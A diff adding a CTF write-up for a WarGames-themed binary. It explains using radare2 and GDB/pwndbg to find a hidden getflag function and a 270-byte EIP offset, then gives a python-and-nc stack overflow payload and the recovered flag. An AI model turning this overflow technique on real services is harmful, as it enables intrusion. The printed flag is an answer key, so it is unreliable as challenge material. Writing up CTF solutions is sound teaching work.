@@ -1,0 +1,15 @@
+***Description***
+Would you dare to start a Global Thermonuclear War?
+
+
+***Solution***
+The binary is obviously inspired from the WarGames movie, so a few things need to be found from the movie in order to proceed through the binary. All the relevant information is here: https://www.youtube.com/watch?v=KXzNo0vR_dU
+Interact with the binary in a correct way by answering the questions as they were answered in the movie (doesn't have to be exact, the binary is only looking for keywords). When you get to the Global Thermonuclear War menu, it asks for countries to nuke, which is susceptible to a stack buffer overflow attack. Analyze also the binary with radare2 to find the hidden function in the binary ("r2 ./binary"; "aaa"; "afl")
+You can see that there is a function called "getflag", so open the binary in GDB, put a breakpoint at main ("break main") and then disassemble the getflag function (disassemble getflag) and take the first address at the beginning (0x56556401). That's the address we need to point the program to when it's overflowed.
+While in the debugger, send a cyclic pattern of 300 bytes in the susceptible input and then discover the offset to EIP. I used Pwndbg plugin in GDB which can generate a cyclic pattern with "cylic 300" and then get the offset with "cyclic -l 0x61736361" and the offset appears to be 270 bytes. So we need to send 270 bytes and then the address to the getflag function in little-endian format and it looks like this:
+
+"python -c 'print "lala\nlala\nGlobal Thermonuclear War\nLater\n" + "A"*270 + "\x01\x64\x55\x56"' | nc -v ctfeh.hh.se 10005"
+
+The binary is overflowed, its EIP is overwritten and the execution flow is redirected to the getflag function, displaying the flag to the screen.
+
+hhctf_flag{193cb9e331d78ea3ca03a2631deaed1d}
